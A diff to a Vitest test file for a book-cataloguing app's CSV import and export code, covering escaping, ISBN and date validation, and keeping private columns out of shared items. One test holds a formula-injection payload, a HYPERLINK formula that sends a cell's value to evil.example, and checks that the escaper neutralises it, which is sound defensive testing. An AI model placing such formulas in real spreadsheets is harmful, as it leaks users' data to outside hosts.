@@ -1,5 +1,7 @@
 import { describe, expect, it } from 'vitest';
-import { csvEscape, csvLine, looksLikeGoodreads, mapGoodreadsRow, mapLibibRow } from '../src/lib/csv';
+import type { Item } from '../src/db/schema';
+import { csvEscape, csvLine, EXPORT_COLUMNS, looksLikeGoodreads, looksLikeNalandaExport, mapGoodreadsRow, mapLibibRow, mapLibraryThingRow, mapStoryGraphRow } from '../src/lib/csv';
+import { toPublicItem } from '../src/lib/share';
 
 describe('csv escaping', () => {
   it('quotes only when needed and doubles quotes', () => {
@@ -9,6 +11,20 @@ describe('csv escaping', () => {
     expect(csvEscape('line\nbreak')).toBe('"line\nbreak"');
     expect(csvEscape(null)).toBe('');
     expect(csvLine(['a', 'b,c'])).toBe('a,"b,c"\r\n');
+  });
+
+  it('guards a cell a spreadsheet would read as a formula with a leading quote, and a leading quote with another (§16 #91)', () => {
+    const evil = '=HYPERLINK("https://evil.example/?d="&A1,"Click")';
+    expect(csvEscape(evil)).toBe(`"'${evil.replaceAll('"', '""')}"`);
+    expect(csvEscape('=1+1')).toBe("'=1+1");
+    expect(csvEscape('+1 Forever')).toBe("'+1 Forever");
+    expect(csvEscape('-')).toBe("'-");
+    expect(csvEscape('@SUM(1+1)*cmd')).toBe("'@SUM(1+1)*cmd");
+    expect(csvEscape('\tx')).toBe("'\tx"); // a tab needs no CSV quoting, only the guard
+    expect(csvEscape("'quoted")).toBe("''quoted"); // so the import's one-quote strip gives it back
+    expect(csvEscape(-1)).toBe('-1'); // a number is never a formula
+    expect(csvEscape('2024-01-01')).toBe('2024-01-01');
+    expect(csvEscape('plain = text')).toBe('plain = text');
   });
 });
 
@@ -66,6 +82,11 @@ describe('libib row mapping', () => {
 
   it('keeps an explicit copies of 0 (cataloged, not owned)', () => {
     expect(mapLibibRow({ title: 'X', copies: '0' }, opts)!.item.copies).toBe(0);
+  });
+  it('splits a group on commas as it does tags, so the export and the next import agree on what the tags are', () => {
+    const m = mapLibibRow({ title: 'X', group: 'sci-fi, classics', tags: 'utopia' }, opts)!;
+    expect(m.tags).toEqual(['utopia', 'sci-fi', 'classics']);
+    expect(mapLibibRow({ title: 'X', group: ' , ' }, opts)!.tags).toEqual([]);
   });
   it("dates an item from libib's `added` (§16 #90), a known column that never lands in details", () => {
     const dated = mapLibibRow({ title: 'X', added: '2021-05-03', esrb: 'E' }, opts)!;
@@ -138,6 +159,13 @@ describe('goodreads row mapping', () => {
     const odd = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'to-read', 'Date Added': 'last spring' })!;
     expect(odd.item).not.toHaveProperty('addedAt');
     expect(JSON.parse(odd.item.details as string)).not.toHaveProperty('date_added'); // not a date: dropped, as nothing can read it
+    // a calendar date, not just four-two-two digits: 2024/13/45 dates nothing, and neither does 29 February 2023
+    const impossible = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'read', 'Date Added': '2024/13/45', 'Date Read': '2023/02/29' })!;
+    expect(impossible.item).not.toHaveProperty('addedAt');
+    expect(impossible.item.completedOn).toBeNull();
+    expect(JSON.parse(impossible.item.details as string)).toEqual({});
+    const leap = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'read', 'Date Added': '2024/02/29', 'Date Read': '2024/02/29' })!;
+    expect(leap.item).toMatchObject({ addedAt: '2024-02-29 00:00:00', completedOn: '2024-02-29' });
   });
 
   it('maps shelf states: to-read, currently-reading, dnf; unrated stays null', () => {
@@ -151,6 +179,19 @@ describe('goodreads row mapping', () => {
     expect(mapGoodreadsRow({ ...base, 'Owned Copies': '1' })!.item.copies).toBe(1);
   });
 
+  it('takes an ISBN column only as an ISBN: hyphens and spaces aside, 13 digits, or nine and a check digit — else text in details', () => {
+    const isbns = (over: Record<string, string>) => {
+      const m = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'to-read', ...over })!;
+      return { isbn13: m.item.isbn13, isbn10: m.item.isbn10Upc, details: JSON.parse(m.item.details as string) as Record<string, string> };
+    };
+    expect(isbns({ 'ISBN': '="0-316-22929-6"', 'ISBN13': '="978-0316229296"' })).toEqual({ isbn13: '9780316229296', isbn10: '0316229296', details: {} });
+    expect(isbns({ 'ISBN': '="080442957x"' })).toMatchObject({ isbn10: '080442957X' });
+    // junk reduced to its digits — "n/a 1" and "see note 1" both to "1" — made two rows match each other on a later batch
+    expect(isbns({ 'ISBN': '="n/a 1"', 'ISBN13': '="see note 1"' })).toEqual({ isbn13: null, isbn10: null, details: { isbn: 'n/a 1', isbn13: 'see note 1' } });
+    expect(isbns({ 'ISBN': '="12345"', 'ISBN13': '="9780316229296 (pbk)"' })).toEqual({ isbn13: null, isbn10: null, details: { isbn: '12345', isbn13: '9780316229296 (pbk)' } });
+    expect(isbns({ 'ISBN': '=""', 'ISBN13': '' })).toEqual({ isbn13: null, isbn10: null, details: {} });
+  });
+
   it('keeps custom exclusive shelves as tags (only the three built-ins are dropped)', () => {
     const m = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'to-re-read', 'Bookshelves': 'sci-fi' })!;
     expect(m.item.status).toBe('not_started'); // unknown exclusive shelf → not started
@@ -158,5 +199,68 @@ describe('goodreads row mapping', () => {
     const dnf = mapGoodreadsRow({ 'Title': 'Y', 'Exclusive Shelf': 'dnf', 'Bookshelves': '' })!;
     expect(dnf.item.status).toBe('abandoned');
     expect(dnf.tags).toEqual(['dnf']); // status set AND shelf kept as a tag
+  });
+});
+
+describe('private columns never fall into details, whatever the file (§9)', () => {
+  const opts = { defaultType: 'book' as const, musicAsVinyl: true };
+  // columns someone might add to a reading site's export before importing it — the page says unknown columns are kept
+  const secrets = {
+    'Location': 'bedroom  safe',
+    'Notes': 'spare key under the mat',
+    'began_on': '2024-01-02',
+    'completed_on': '2024-02-03',
+    'loans': '2025-01-01..@Priya',
+    'purchase_price': '12.50',
+    'media_condition': 'VG+',
+    'added_by': 'asha',
+  };
+  const published = (item: Record<string, unknown>) => JSON.stringify(toPublicItem({ id: 1, libraryId: 1, ...item } as unknown as Item));
+
+  it('a Goodreads, StoryGraph or LibraryThing row maps location and notes onto their columns and keeps the rest out', () => {
+    const gr = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'read', 'Private Notes': 'from Goodreads', 'Binding': 'Paperback', ...secrets })!;
+    expect(gr.item.location).toBe('bedroom safe');
+    expect(gr.item.notes).toBe('from Goodreads\n\nspare key under the mat');
+    expect(JSON.parse(gr.item.details as string)).toEqual({ binding: 'Paperback' });
+
+    const sg = mapStoryGraphRow({ 'Title': 'X', 'Read Status': 'read', 'Dates Read': '', 'Moods': 'tense', 'Contributors': 'Someone', ...secrets })!;
+    expect(sg.item.location).toBe('bedroom safe');
+    expect(sg.item.notes).toBe('spare key under the mat\n\nStoryGraph — moods: tense');
+    expect(JSON.parse(sg.item.details as string)).toEqual({ contributors: 'Someone' });
+
+    const lt = mapLibraryThingRow({ 'Title': 'X', 'Primary Author': 'Y', 'Entry Date': '2020-01-01', 'Comment': 'signed', 'Subjects': 'Sf', ...secrets })!;
+    expect(lt.item.location).toBe('bedroom safe'); // a location column first, Other Call Number otherwise
+    expect(lt.item.notes).toBe('signed\n\nspare key under the mat');
+    expect(JSON.parse(lt.item.details as string)).toEqual({ subjects: 'Sf' });
+
+    for (const m of [gr, sg, lt]) {
+      const out = published(m.item);
+      for (const secret of ['bedroom', 'spare key', '2024-02-03', 'Priya', '12.50', 'VG+', 'asha']) expect(out, m.item.title).not.toContain(secret);
+    }
+  });
+
+  it('a Nalanda export missing its details column reads as libib, its dates on the item and nothing private in details', () => {
+    const headers = EXPORT_COLUMNS.filter((c) => c !== 'details'); // deleted in a spreadsheet; every other column intact
+    expect(looksLikeNalandaExport(headers)).toBe(false);
+    const row: Record<string, string> = Object.fromEntries(headers.map((h) => [h, '']));
+    Object.assign(row, {
+      title: 'Kindred',
+      media_type: 'book',
+      status: 'completed',
+      began_on: '2024-01-02',
+      completed_on: '2024-02-03',
+      location: 'Study',
+      notes: 'private',
+      reads: 'completed:2024-01-02..2024-02-03@asha',
+      loans: '2025-01-01..@Priya',
+      added_by: 'asha',
+      purchase_price: '12.50',
+      purchase_currency: 'INR',
+    });
+    const m = mapLibibRow(row, opts)!;
+    expect(m.item).toMatchObject({ beganOn: '2024-01-02', completedOn: '2024-02-03', location: 'Study', notes: 'private', purchasePrice: 1250, purchaseCurrency: 'INR' });
+    expect(JSON.parse(m.item.details as string)).toEqual({});
+    const out = published(m.item);
+    for (const secret of ['2024-02-03', 'Study', 'private', 'Priya', 'asha', '12.50']) expect(out).not.toContain(secret);
   });
 });
